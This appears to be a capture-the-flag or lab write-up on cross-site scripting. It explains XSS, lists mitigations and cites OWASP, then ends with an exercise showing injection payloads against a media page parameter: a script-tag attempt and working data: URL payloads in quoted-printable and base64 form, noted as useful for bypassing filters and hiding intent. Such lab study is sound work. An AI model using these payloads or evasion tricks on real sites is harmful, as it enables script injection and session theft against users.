# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

## Mitigations

To protect against XSS attacks:
- Escape output based on context: HTML, JavaScript, CSS, URL, sse functions like htmlspecialchars() or template engines that auto-escape
- Validate and sanitize user input (both client-side and server-side)
- Use Content Security Policy (CSP) to limit what scripts can execute
- Use HTTP-only and Secure flags for cookies to prevent access via JavaScript
- Avoid inline JavaScript — use external scripts instead
- Implement frameworks that auto-sanitize inputs, like React, Angular, or Vue
- Enable modern browser protections, such as X-XSS-Protection header (deprecated but still useful in some contexts)

## References
- [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)

## Exercise

Similar to XXFunction, we try to replicate the attack in a different way on index.php?page=media&src=nsa.

1. We try to inject the script in query string directly
```
?page=media&src=<script> alert(1) </script>
```

2. With no success, we try different combination and encodings and succeed with the last one
```
?page=media&src=data:text/html;encoding=quoted-printable,This=20is=20a=20script=3A <script>alert(1)</script> 
?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoMSkgPC9zY3JpcHQ+
```
Encoding helps to:
- bypass input filtering
- use inside data: URLs
- avoid breaking query strings
- hide intent